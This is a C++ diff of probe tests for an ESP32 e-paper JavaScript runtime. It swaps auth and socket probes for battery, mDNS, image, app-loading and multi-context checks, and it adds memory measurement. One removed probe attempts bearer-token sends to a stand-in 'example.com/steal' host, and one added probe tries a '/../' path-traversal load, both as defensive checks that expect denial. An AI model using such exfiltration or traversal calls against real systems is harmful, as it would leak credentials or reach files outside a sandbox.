@@ -6,8 +6,6 @@
 #include <cstdio>
 #include "app_js.h"
 #include "app_js_internal.h"
-#include "net_auth.h"
-#include "net_socket.h"
 #include "s3paper/text.h"
 #include "esp_heap_caps.h"
 #include <cstring>
@@ -399,67 +397,182 @@ const char kProbe18Js[] =
     "      + ' start2=' + serve.start(8080)"
     "      + ' stop=' + serve.stop());";
 
-// Probe 19 (ESP-54): device-auth surface and token-exfiltration guards.
-// No credential is created. Both arbitrary-origin bearer builders must throw.
+// Probe 19 (ESP-54 P1): battery singleton + legacy alias. Asserts level is
+// in range, charging is a known flag, and the formatted status text is
+// non-empty. The legacy batteryLevel() global must still equal battery.level().
 const char kProbe19Js[] =
-    "socket.stop(); auth.clear();"
-    "var c = auth.configure('https://192.168.0.39:8790/idp',"
-    "  'pulp-papers3', 'openid profile demo.read sensors.read',"
-    "  'https://192.168.0.39:8790/api');"
-    "var h = 'no', w = 'no';"
-    "try { http.get('https://example.com/steal').bearer(); }"
-    "catch (e) { h = 'yes'; }"
-    "try { socket.open('wss://example.com/steal'); }"
-    "catch (e2) { w = 'yes'; }"
-    "print('probe19: configure=' + c + ' state=' + auth.stateName()"
-    "  + ' http-host-denied=' + h + ' ws-host-denied=' + w"
-    "  + ' token-accessor=' + (typeof auth.token));";
+    "var lvl = battery.level();"
+    "var mv = battery.mv();"
+    "var ch = battery.charging();"
+    "var st = battery.statusText();"
+    "var legacy = batteryLevel();"
+    "var lvlOk = (lvl >= -1 && lvl <= 100) ? 'ok' : 'BAD';"
+    "var chOk = (ch >= -1 && ch <= 1) ? 'ok' : 'BAD';"
+    "var match = (lvl === legacy) ? 'match' : 'MISMATCH';"
+    "print('probe19: level=' + lvl + ' (' + lvlOk + ') mv=' + mv"
+    "      + ' charging=' + ch + ' (' + chOk + ') statusText=\"' + st + '\"'"
+    "      + ' legacy=' + match);";
 
-// Probe 20 starts a real device grant but deliberately preserves an existing
-// authorized session. Inspect `auth status` after the asynchronous request.
+// Probe 20 (ESP-54 P2): mDNS accessors. Asserts status is 0 or 1, host is
+// "pulp", and url is empty when not announced or http://pulp.local when up.
 const char kProbe20Js[] =
-    "if (auth.state() === 0) {"
-    "  auth.configure('https://192.168.0.39:8790/idp', 'pulp-papers3',"
-    "    'openid profile demo.read sensors.read',"
-    "    'https://192.168.0.39:8790/api');"
-    "}"
-    "function begin20(ok) {"
-    "  var rc = auth.state() === 5 ? 0 : (ok ? auth.start() : 1);"
-    "  print('probe20: network=' + ok + ' start=' + rc"
-    "    + ' state=' + auth.stateName()"
-    "    + ' authorized-preserved=' + (auth.state() === 5));"
-    "}"
-    "if (auth.state() === 5 || wifi.status() === 4) { begin20(1); }"
-    "else if (wifi.savedCount() > 0) {"
-    "  wifi.joinSaved(function(k, ok, err) { begin20(ok); });"
-    "} else { begin20(0); }";
+    "var st = mdns.status();"
+    "var h = mdns.host();"
+    "var u = mdns.url();"
+    "var stOk = (st === 0 || st === 1) ? 'ok' : 'BAD';"
+    "var hOk = (h === 'pulp') ? 'ok' : 'BAD';"
+    "var uOk = (st === 0 ? u === '' : u.indexOf('pulp.local') >= 0)"
+    "  ? 'ok' : 'BAD';"
+    "print('probe20: status=' + st + ' (' + stOk + ') host=' + h"
+    "      + ' (' + hOk + ') url=\"' + u + '\" (' + uOk + ')');";
 
-// Probe 21 exercises native bearer injection against the protected REST API.
-// The callback print proves status/body visibility without exposing the token.
+// Probe 21 (ESP-54 P4): images catalog + display. Lists the catalog and, if
+// non-empty, displays the first image. Expected: count >= 0, name(0) set
+// when count > 0, display returns 0 when an image exists.
 const char kProbe21Js[] =
-    "http.get('https://192.168.0.39:8790/api/v1/me').bearer().limit(2048)"
-    ".done(function(k, status, len) {"
-    "  print('probe21: status=' + status + ' len=' + len"
-    "    + ' body=' + http.body());"
-    "}).send();";
+    "var n = images.count();"
+    "var first = n > 0 ? images.name(0) : '';"
+    "var disp = n > 0 ? images.display(first) : -1;"
+    "print('probe21: count=' + n + ' first=\"' + first + '\"'"
+    "      + ' display=' + disp);";
 
-// Probe 22 starts the authenticated WSS stream. Follow with `socket status`
-// after several seconds to inspect connection, receive, drop, and ring counts.
+// Probe 22 (ESP-54 P3): images upload-received registration. Registers a
+// received callback and asserts the module-cb path accepts it; a second
+// registration without completion must throw "module busy".
 const char kProbe22Js[] =
-    "socket.stop();"
-    "var rc = socket.open('wss://192.168.0.39:8790/api/v1/sensors/ws')"
-    "  .bearer().start();"
-    "print('probe22: start=' + rc + ' state=' + socket.stateName());";
+    "var ok = 'no';"
+    "images.received(function (k, bytes, err) {"
+    "  print('probe22: received k=' + k + ' bytes=' + bytes + ' err=' + err);"
+    "});"
+    "ok = 'registered';"
+    "var busy = 'no';"
+    "try { images.received(function () {}); }"
+    "catch (e) { busy = 'yes'; }"
+    "print('probe22: cb=' + ok + ' second-busy=' + busy);";
 
-// Probe 23 validates retained QR rendering and bounded argument failures.
+// 23 (ESP-55 P3): load() happy path + every failure mode is a catchable
+// JS exception (missing asset, bad SD path, missing file).
 const char kProbe23Js[] =
-    "resetTree();"
-    "var q = canvas().width(460).height(240);"
-    "q.qr('https://example.test/device?user_code=ABCD-EFGH', 220);"
-    "var small = 'no'; try { q.qr('x', 20); } catch (e) { small = 'yes'; }"
-    "page('probe23').content(col().pad(24,40,24,40)"
-    "  .add(text('QR PROBE').size('lg').center(), q)).show(true);"
-    "print('probe23: rendered=yes small-denied=' + small);";
+    "var d = load('rom:dice');"
+    "print('probe23: dice typeof=' + typeof d.main + ' id=' + d.id"
+    "      + ' abi=' + d.abi);"
+    "var miss = 'no'; try { load('rom:nope'); } catch (e) { miss = '' + e; }"
+    "print('probe23: miss=' + miss);"
+    "var bad = 'no'; try { load('/../x.js'); } catch (e2) { bad = '' + e2; }"
+    "print('probe23: badpath=' + bad);"
+    "var sd = 'no'; try { load('/apps/missing.js'); }"
+    "catch (e3) { sd = '' + e3; }"
+    "print('probe23: sd=' + sd);";
+
+// 24 (ESP-55 P4): asset registry + sync copy/writeText + SD load round
+// trip + merged catalog surface.
+const char kProbe24Js[] =
+    "print('probe24: assets=' + apps.count());"
+    "var rc = apps.copy('dice', '/apps/probe24.js');"
+    "print('probe24: copy=' + rc);"
+    "var d = rc === 0 ? load('/apps/probe24.js') : null;"
+    "print('probe24: sdload=' + (d ? d.id : 'skip'));"
+    "var w = apps.writeText('/apps/probe24.txt', 'x');"
+    "print('probe24: write=' + w);"
+    "var c = catalog();"
+    "print('probe24: catalog=' + c.length + ' dice_src='"
+    "      + catalogFind('dice').src);"
+    "files.remove('/apps/probe24.txt', function () {"
+    "  files.remove('/apps/probe24.js', function () {});"
+    "});";
+
+// 25 (ESP-55 P5): the OS upload watcher (appsWatch, re-registered by
+// every enter()) must hold the Apps module slot — a probe registration
+// must throw "module busy" — and the name mailbox must answer.
+const char kProbe25Js[] =
+    "var busy = 'no';"
+    "try { apps.received(function () {}); } catch (e) { busy = 'yes'; }"
+    "print('probe25: os-watch-busy=' + busy"
+    "      + ' name=\"' + apps.uploadName() + '\"');";
+
+// 26 (ESP-55 P6): pull-install core — sync writeText of a descriptor,
+// load round trip, id derivation edge cases.
+const char kProbe26Js[] =
+    "var w = apps.writeText('/apps/probe26.js',"
+    "  \"({id:'probe26',title:'P26',version:1,abi:2,\" +"
+    "  \"main:function(o,a){}})\");"
+    "print('probe26: write=' + w);"
+    "var d = w === 0 ? load('/apps/probe26.js') : null;"
+    "print('probe26: load=' + (d ? d.id : 'skip') + ' main='"
+    "      + (d ? typeof d.main : '-'));"
+    "print('probe26: id1=' + idFromUrl('http://h:8/x/dice.js?v=1')"
+    "      + ' id2=' + idFromUrl('http://h/UPPER.js')"
+    "      + ' id3=' + idFromUrl('http://h/'));"
+    "files.remove('/apps/probe26.js', function () {});";
+
+// 27 (ESP-55 P8): multi-context — create a second engine context,
+// prove global isolation, per-context callback registries, OOM
+// containment, foreground stability, and full teardown reclamation.
+extern "C" const JSSTDLibraryDef js_stdlib;
+
+StatusCode RunProbe27() {
+    const uint32_t psram0 = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);
+    jsi::JsCtxState *st = jsi::CreateContext(
+        jsi::CtxKind::kProbe, 64 * 1024, &js_stdlib, nullptr, 0);
+    if (st == nullptr) {
+        printf("probe27: create FAILED\n");
+        return StatusCode::OutOfMemory;
+    }
+    (void)jsi::EvalInto(st,
+        "var probe27x = 42; print('probe27: inner x=' + probe27x);",
+        2000, "<p27>");
+    (void)jsi::EvalBounded(
+        "print('probe27: os sees=' + (typeof probe27x));", 2000,
+        "<p27os>");
+    printf("probe27: os_next_cb=%d probe_next_cb=%d fg_is_os=%d\n",
+           static_cast<int>(jsi::g_os->next_cb),
+           static_cast<int>(st->next_cb),
+           jsi::g_fg == jsi::g_os ? 1 : 0);
+    // OOM containment: exhaust the 64 KiB context; the exception must be
+    // catchable there and the OS context must stay healthy.
+    (void)jsi::EvalInto(st,
+        // Note: report AFTER gc() — building the message while the arena
+        // is still full would OOM again (uncatchable second failure).
+        "var a = []; var oom = 'no';"
+        "try { for (;;) { a.push('xxxxxxxxxxxxxxxx' + a.length); } }"
+        "catch (e) { oom = 'caught'; }"
+        "a = null; gc(); print('probe27: oom=' + oom);",
+        3000, "<p27oom>");
+    (void)jsi::EvalBounded(
+        "print('probe27: os alive=' + (1 + 1));", 2000, "<p27alive>");
+    jsi::DestroyContext(st);
+    const uint32_t psram1 = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);
+    printf("probe27: psram_delta_after_teardown=%d\n",
+           static_cast<int>(psram0) - static_cast<int>(psram1));
+    return StatusCode::Ok;
+}
+
+// 28 (ESP-55 P9): the UI sandbox — run the probe page in a fresh page
+// context (denials print from inside the sandbox), then close it.
+const char kProbe28Js[] =
+    "var rc = browser.run('page:probe-page', 'probe://x');"
+    "print('probe28: run=' + rc);"
+    "print('probe28: navKind=' + browser.navKind()"
+    "      + ' navUrl=\"' + browser.navUrl() + '\"');"
+    "print('probe28: close=' + browser.close());";
+
+// 29 (ESP-58 P1): mdns.browse against a _pulp-apps._tcp server on the
+// LAN (ticket scripts/01-app-index-server.py). Prints rc, then the
+// result snapshot from the completion. Also exercises the error paths:
+// a second browse during the window must return Busy (2).
+const char kProbe29Js[] =
+    "var rc = mdns.browse(function (k, n, e) {"
+    "  print('probe29: done k=' + k + ' n=' + n + ' e=' + e);"
+    "  var i;"
+    "  for (i = 0; i < mdns.count(); i++) {"
+    "    print('probe29: [' + i + '] ' + mdns.name(i) + ' -> '"
+    "          + mdns.indexUrl(i));"
+    "  }"
+    "});"
+    "print('probe29: rc=' + rc);"
+    "var busy = 0;"
+    "try { busy = mdns.browse(function () {}); } catch (e2) { busy = -1; }"
+    "print('probe29: second=' + busy + ' (2=Busy expected when rc=0)');";
 
 StatusCode RunTraced(const char *code, const char *name) {
     s3paper_runtime::SetTracePresent(true);
@@ -469,7 +582,72 @@ StatusCode RunTraced(const char *code, const char *name) {
     return ran;
 }
 
+#include "js_measure_src.h"  // ESP-55 Phase 0: dice + settings sources
+
+// Evals one embedded module source under the standard deadline, printing
+// wall time and arena use (before, after, after GC). Returns the eval rc.
+StatusCode MeasureOne(const char *name, const unsigned char *src,
+                      unsigned len) {
+    const uint32_t before = JS_GetHeapUsed(jsi::g_os->ctx);
+    const int64_t t0 = esp_timer_get_time();
+    const StatusCode rc =
+        jsi::EvalBounded(reinterpret_cast<const char *>(src), 3000, name);
+    const int64_t dt = esp_timer_get_time() - t0;
+    const uint32_t after = JS_GetHeapUsed(jsi::g_os->ctx);
+    JS_GC(jsi::g_os->ctx);
+    const uint32_t gc = JS_GetHeapUsed(jsi::g_os->ctx);
+    printf("measure: %s bytes=%u rc=%s us=%lld arena before=%u after=%u "
+           "(+%d) gc=%u (+%d)\n",
+           name, len, StatusCodeName(rc), static_cast<long long>(dt),
+           static_cast<unsigned>(before), static_cast<unsigned>(after),
+           static_cast<int>(after - before), static_cast<unsigned>(gc),
+           static_cast<int>(gc - before));
+    return rc;
+}
+
 }  // namespace
+
+// ESP-55 Phase 0 (console: js measure). Evidence lines are stable-prefixed
+// "measure:" for the console transcript.
+StatusCode JsRunMeasure() {
+    const StatusCode init = JsInit();
+    if (init != StatusCode::Ok) {
+        return init;
+    }
+    const uint32_t boot_used = JS_GetHeapUsed(jsi::g_os->ctx);
+    JS_GC(jsi::g_os->ctx);
+    printf("measure: baseline arena_used=%u after_gc=%u internal_free=%u "
+           "psram_free=%u\n",
+           static_cast<unsigned>(boot_used),
+           static_cast<unsigned>(JS_GetHeapUsed(jsi::g_os->ctx)),
+           static_cast<unsigned>(
+               heap_caps_get_free_size(MALLOC_CAP_INTERNAL)),
+           static_cast<unsigned>(
+               heap_caps_get_free_size(MALLOC_CAP_SPIRAM)));
+    StatusCode rc = MeasureOne("<dice>", kMeasureDice, kMeasureDiceLen);
+    if (rc != StatusCode::Ok) { return rc; }
+    rc = MeasureOne("<settings>", kMeasureSettings, kMeasureSettingsLen);
+    if (rc != StatusCode::Ok) { return rc; }
+    // Flatness: ten repeated evals of dice with GC between them must not
+    // grow the arena (redefinition garbage is fully collectable).
+    uint32_t used[10];
+    for (int i = 0; i < 10; ++i) {
+        const StatusCode r = jsi::EvalBounded(
+            reinterpret_cast<const char *>(kMeasureDice), 3000, "<dice-n>");
+        if (r != StatusCode::Ok) { return r; }
+        JS_GC(jsi::g_os->ctx);
+        used[i] = JS_GetHeapUsed(jsi::g_os->ctx);
+    }
+    printf("measure: dice x10 arena_after_gc:");
+    for (int i = 0; i < 10; ++i) {
+        printf(" %u", static_cast<unsigned>(used[i]));
+    }
+    printf("\n");
+    printf("measure: done internal_free=%u\n",
+           static_cast<unsigned>(
+               heap_caps_get_free_size(MALLOC_CAP_INTERNAL)));
+    return StatusCode::Ok;
+}
 
 StatusCode JsRunProbe(uint32_t which) {
     const StatusCode init = JsInit();
@@ -516,11 +694,15 @@ StatusCode JsRunProbe(uint32_t which) {
         case 18: return jsi::EvalBounded(kProbe18Js, 3000, "<probe18>");
         case 19: return jsi::EvalBounded(kProbe19Js, 3000, "<probe19>");
         case 20: return jsi::EvalBounded(kProbe20Js, 3000, "<probe20>");
-        case 21: return jsi::EvalBounded(kProbe21Js, 3000, "<probe21>");
+        case 21: return jsi::EvalBounded(kProbe21Js, 5000, "<probe21>");
         case 22: return jsi::EvalBounded(kProbe22Js, 3000, "<probe22>");
-        case 23: return jsi::EvalBounded(kProbe23Js, 3000, "<probe23>");
-        case 24: return AuthRunParserProbe();
-        case 25: return SocketRunParserProbe();
+        case 23: return jsi::EvalBounded(kProbe23Js, 5000, "<probe23>");
+        case 24: return jsi::EvalBounded(kProbe24Js, 5000, "<probe24>");
+        case 25: return jsi::EvalBounded(kProbe25Js, 3000, "<probe25>");
+        case 26: return jsi::EvalBounded(kProbe26Js, 5000, "<probe26>");
+        case 27: return RunProbe27();
+        case 28: return jsi::EvalBounded(kProbe28Js, 8000, "<probe28>");
+        case 29: return jsi::EvalBounded(kProbe29Js, 3000, "<probe29>");
         default: return StatusCode::InvalidArgument;
     }
 }
